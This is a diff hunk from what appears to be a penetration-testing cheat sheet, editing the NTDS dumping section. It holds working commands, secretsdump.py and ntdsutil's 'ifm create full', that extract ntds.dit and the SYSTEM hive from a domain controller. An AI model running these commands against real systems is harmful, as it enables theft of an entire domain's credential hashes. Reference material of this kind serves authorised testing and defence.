@@ -276,7 +276,7 @@
                 *   NTDS Dumping
                     *   `secretsdump.py -ntds NTDS.dit.save -system SYSTEM.save LOCAL`
                     *   NTDSUtil
-                        *   `powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q"`
+                        *   `ntdsutil 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q`
                         *   `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
                         *   `C:\Windows\Temp\NTDS\registry\SYSTEM`
                     *   VSSAdmin
